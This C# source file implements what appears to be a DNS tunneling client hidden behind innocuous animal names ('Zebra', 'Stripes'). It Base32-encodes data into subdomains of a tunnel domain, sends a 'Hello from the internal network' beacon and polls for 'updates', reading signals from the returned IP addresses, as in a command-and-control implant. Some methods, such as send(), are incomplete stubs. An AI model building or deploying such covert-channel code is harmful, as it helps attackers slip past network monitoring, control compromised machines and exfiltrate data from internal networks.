using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;

namespace AnimalZoo
{
    class Zebra
    {
        public bool running = true;
        public int max_frag_len = 30;

        private Random rng;

        private string tun_domain;
        public Zebra(string domain)
        {
            tun_domain = domain;
            running = true;
            rng = new Random();
        }

        private IPAddress getResponseToChunk(byte[] chunk)
        {
            string encodedMsg = Stripes.ToString(chunk);
            string domain = encodedMsg + "." + tun_domain;
            Console.WriteLine(domain);
            IPAddress[] ips = Dns.GetHostAddresses(domain);
            foreach (IPAddress ipaddr in ips)
            {
                Console.WriteLine(ipaddr);
            }

            if (ips.Length >= 1)
            {
                return ips[0];
            }
            else
            {
                return null;
            }
        }
        public bool sendHello()
        {
            byte[] helloString = Encoding.ASCII.GetBytes(" Hello from the internal network");
            helloString[0] = (byte)(rng.Next() % 256);
            byte[] exptedResp = { 13, 77, 33, 13 };

            IPAddress ip = getResponseToChunk(helloString);
            byte[] msg = ip.GetAddressBytes();
            
            //Console.Write("Server reply: ", ip);
            return true;
        }

        public bool send(byte[] data)
        {
            Dns.GetHostEntry("" + tun_domain);

            return true;
        }

        public bool getUpdate()
        {
            byte[] updateString = Encoding.ASCII.GetBytes("\0?");
            updateString[0] = (byte)(rng.Next() % 256);
            string encodedMsg = Stripes.ToString(updateString);

            IPHostEntry ip = Dns.GetHostEntry(encodedMsg + "." + tun_domain);
            if (ip.ToString() == "13.13.13.13")
            {
                return false;
            }
            else
            {
                Console.Write("Update received");
                return true;
            }
        }

        public class Stripes
        {
            public static byte[] ToBytes(string input)
            {
                if (string.IsNullOrEmpty(input))
                {
                    throw new ArgumentNullException("input");
                }

                input = input.TrimEnd('='); //remove padding characters
                int byteCount = input.Length * 5 / 8; //this must be TRUNCATED
                byte[] returnArray = new byte[byteCount];

                byte curByte = 0, bitsRemaining = 8;
                int mask = 0, arrayIndex = 0;

                foreach (char c in input)
                {
                    int cValue = CharToValue(c);

                    if (bitsRemaining > 5)
                    {
                        mask = cValue << (bitsRemaining - 5);
                        curByte = (byte)(curByte | mask);
                        bitsRemaining -= 5;
                    }
                    else
                    {
                        mask = cValue >> (5 - bitsRemaining);
                        curByte = (byte)(curByte | mask);
                        returnArray[arrayIndex++] = curByte;
                        curByte = (byte)(cValue << (3 + bitsRemaining));
                        bitsRemaining += 3;
                    }
                }

                //if we didn't end with a full byte
                if (arrayIndex != byteCount)
                {
                    returnArray[arrayIndex] = curByte;
                }

                return returnArray;
            }

            public static string ToString(byte[] input)
            {
                if (input == null || input.Length == 0)
                {
                    throw new ArgumentNullException("input");
                }

                int charCount = (int)Math.Ceiling(input.Length / 5d) * 8;
                char[] returnArray = new char[charCount];

                byte nextChar = 0, bitsRemaining = 5;
                int arrayIndex = 0;

                foreach (byte b in input)
                {
                    nextChar = (byte)(nextChar | (b >> (8 - bitsRemaining)));
                    returnArray[arrayIndex++] = ValueToChar(nextChar);

                    if (bitsRemaining < 4)
                    {
                        nextChar = (byte)((b >> (3 - bitsRemaining)) & 31);
                        returnArray[arrayIndex++] = ValueToChar(nextChar);
                        bitsRemaining += 5;
                    }

                    bitsRemaining -= 3;
                    nextChar = (byte)((b << bitsRemaining) & 31);
                }

                //if we didn't end with a full char
                if (arrayIndex != charCount)
                {
                    returnArray[arrayIndex++] = ValueToChar(nextChar);
                    //while (arrayIndex != charCount) returnArray[arrayIndex++] = '='; //padding
                }

                return new string(returnArray).Trim('\0');
            }

            private static int CharToValue(char c)
            {
                int value = (int)c;

                //65-90 == uppercase letters
                if (value < 91 && value > 64)
                {
                    return value - 65;
                }
                //50-55 == numbers 2-7
                if (value < 56 && value > 49)
                {
                    return value - 24;
                }
                //97-122 == lowercase letters
                if (value < 123 && value > 96)
                {
                    return value - 97;
                }

                throw new ArgumentException("Character is not a Base32 character.", "c");
            }

            private static char ValueToChar(byte b)
            {
                if (b < 26)
                {
                    return (char)(b + 65);
                }

                if (b < 32)
                {
                    return (char)(b + 24);
                }

                throw new ArgumentException("Byte is not a value Base32 value.", "b");
            }

        }
    }
}
